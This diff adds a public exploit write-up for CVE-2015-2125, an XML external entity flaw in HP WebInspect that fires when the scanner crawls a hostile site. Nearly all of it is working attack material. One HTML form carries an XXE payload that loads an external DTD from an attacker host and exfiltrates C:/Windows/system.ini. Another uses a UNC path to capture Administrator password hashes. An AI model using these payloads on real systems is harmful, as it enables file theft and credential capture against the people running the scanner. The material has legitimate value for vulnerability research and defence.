@@ -1,0 +1,41 @@
+# Exploit Title: HP WebInspect - XML External Entity
+# Date: 23\04\2015
+# Exploit Author: Jakub Palaczynski
+# Vendor Homepage: http://www.hp.com/
+# Version: 10.4, 10.3, 10.2, 10.1, 10.0, 9.x, 8.x, 7.x
+# CVE : CVE-2015-2125
+
+1. Create website that exploits vulnerability.
+
+1.1. Website that steals files using OOB technique:
+1.1.1. Website that triggers vulnerability:
+<html>
+<body>
+
+<form action="/" method="POST">
+<input type="hidden" name="payload" value='<?xml+version="1.0"+encoding="utf-8"?><!DOCTYPE+m+[+<!ENTITY+%25+remote+SYSTEM+"http://attacker/file.xml">%25remote;%25int;%25trick;]><tag></tag>'/>
+<input type="submit" value="Submit" />
+</form>
+
+</body>
+</html>
+1.1.2. file.xml file that is served on attacker's host. This file specifies which file should be retrieved from remote host and where content of that file should be sent:
+<!ENTITY % payl SYSTEM "file:///C:/Windows/system.ini">
+
+<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://attacker/?p=%payl;'>">
+
+1.2. Website that steals hashes of Administrator user:
+1.2.1. Website that triggers vulnerability:
+<html>
+<body>
+
+<form action="/" method="POST">
+<input type="hidden" name="payload" value='<?xml+version="1.0"+encoding="utf-8"?><!DOCTYPE+m+[+<!ENTITY+%25+remote+SYSTEM+"\\attacker\path\file.txt">%25remote;]><tag></tag>'/>
+<input type="submit" value="Submit" />
+</form>
+
+</body>
+</html>
+1.2.2. Attacker needs to start tool on the server that captures hashes.
+
+2. Exploit is triggered while profiling or scanning created application using vulnerable versions of HP WebInspect.
